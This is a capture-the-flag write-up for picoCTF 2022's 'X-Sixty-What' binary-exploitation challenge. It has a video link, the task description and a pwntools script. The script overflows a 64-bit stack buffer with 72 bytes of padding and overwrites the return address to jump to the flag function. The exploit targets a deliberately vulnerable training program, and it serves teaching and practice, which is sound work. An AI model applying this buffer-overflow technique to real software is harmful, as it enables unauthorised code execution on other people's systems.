---
name: X-Sixty-What (2022)
event: Pico CTF 2022
category: Pwn
description: Writeup for X-Sixty-What (Pwn) - Pico CTF (2022) 💜
layout:
    title:
        visible: true
    description:
        visible: true
    tableOfContents:
        visible: true
    outline:
        visible: true
    pagination:
        visible: true
---

# X-Sixty-What

## Video Walkthrough

[![VIDEO](https://img.youtube.com/vi/dAsujQ_OPEk/0.jpg)](https://youtu.be/dAsujQ_OPEk?t=2358 "Pico CTF 2022: X-Sixty-What")

## Description

> Most problems before this are 32-bit x86. Now we’ll consider 64-bit x86 which is a little different! Overflow the buffer and change the return address to the flag function in this program.

## Solution

{% code overflow="wrap" %}
```py
from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

# Set up pwntools for the correct architecture
exe = './vuln'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

io = start()

# How many bytes to the instruction pointer (EIP)?
padding = 72

payload = flat(
    b'A' * padding,
    0x40123b
)

# Save the payload to file
write('payload', payload)

# Send the payload
io.sendlineafter(b':', payload)

# Receive the flag
io.interactive()
```
{% endcode %}
